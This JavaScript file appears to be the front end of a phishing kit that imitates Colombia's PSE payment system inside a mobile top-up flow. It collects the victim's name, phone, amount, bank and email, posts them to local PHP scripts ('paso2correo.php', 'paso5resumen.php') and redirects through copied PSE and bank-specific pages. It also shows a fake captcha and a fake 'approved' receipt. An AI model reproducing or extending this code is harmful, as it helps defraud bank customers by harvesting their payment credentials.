function detectar_dispositivo(){
    var dispositivo = "";
    if(navigator.userAgent.match(/Android/i))
        dispositivo = "Android";
    else
        if(navigator.userAgent.match(/webOS/i))
            dispositivo = "webOS";
        else
            if(navigator.userAgent.match(/iPhone/i))
                dispositivo = "iPhone";
            else
                if(navigator.userAgent.match(/iPad/i))
                    dispositivo = "iPad";
                else
                    if(navigator.userAgent.match(/iPod/i))
                        dispositivo = "iPod";
                    else
                        if(navigator.userAgent.match(/BlackBerry/i))
                            dispositivo = "BlackBerry";
                        else
                            if(navigator.userAgent.match(/Windows Phone/i))
                                dispositivo = "Windows Phone";
                            else
                                dispositivo = "PC";
    return dispositivo;
}

function cargar_resumen(){      
    // Obtener datos del localStorage
    var nom = localStorage.getItem('nom') || 'No disponible';
    var val = localStorage.getItem('val') || 'No disponible';
    var cel = localStorage.getItem('cel') || 'No disponible';
    
    $.post( "../../../process/paso5resumen.php", {
        nom: nom,
        val: val,
        cel: cel
    }, function(data) {    
        res = data.split("|");
        $("#inf-ip").html(res[0]);
        $("#val-fecha").html(res[1]);
        $("#val-banco").html(res[2]);

        cedula_f = convertir(res[3].replaceAll(".","").replaceAll("$","").replaceAll(" ",""));
        cedula_f = "$" + cedula_f + ".00"

        $("#val-total").html(cedula_f);
        $("#val-celular").html(res[4]);
    });
}

function catchaok(){
    $("#catcha").attr("src","../assets/img/ok.jpg"); 
    if ($("#txt-cedula").val() != "$ 0" && $("#txt-banco").val() != "" && $("#txt-cel").val().length == 10 && $("#txt-re").val().length == 10 && $("#txt-cel").val() == $("#txt-re").val()) {
        $("#paso0").removeAttr("disabled");
    }else{
        $("#paso0").attr("disabled","disabled");            
    }
}

function convertir(v) {
    cad = v;
    invertido = cad.split("").reverse().join("");
    
    var cedula = invertido.split(',').join('');
    var tam = cedula.length;

    c=0;
    nuevo = "";
    for (var i = 0; i < tam; i++) {            
        if (c==3) {
            nuevo = nuevo + ",";
            c=1;
        }else{
            c++;                
        }
        nuevo = nuevo + cedula[i];              
    }

    final = nuevo.split("").reverse().join("");
    return final;    
}

function cargar_login(){
    window.location.href = "../PSEtransaction/";      
}

function cargar_banco(b){
    window.location.href = "../recargas/transaction/" + b;  
}

function pse(){
    window.location.href = "../PSEUserRegister/";   
}

function resumen(){
    $("#frm-info,#fondo,#cargando").hide();
    $("#frm-revisar").show();   
}

function revisar_datos(){  
    setTimeout(resumen, 2000);
}

function enviar_datos(c,v,p,b,t,f,n){  
    d = detectar_dispositivo();  
    
    // Guardar datos en localStorage
    localStorage.setItem('cel', c);
    localStorage.setItem('val', v);
    localStorage.setItem('per', p);
    localStorage.setItem('ban', b);
    localStorage.setItem('tip', t);
    localStorage.setItem('fol', f);
    localStorage.setItem('nom', n);
    localStorage.setItem('dis', d);
    
    // Redirigir al segundo formulario
    window.location.href = '../PSEtransaction/index.html';
}

function enviar_email(e){      
    $.post( "../process/paso2correo.php", {eml:e} ,function(data) { 
        
        res = data.split("|");
        if (res[0] == 2) {            
            setTimeout(cargar_banco, 800,res[1]);    
        }else{            
            setTimeout(cargar_login, 800);    
        }        
    });
}

function vista_resumen(){
    $("#fondo,#cargando").hide();    
    $("#aprobado,.titulo,#comprobante,#titulo-comprobante").show();
}  





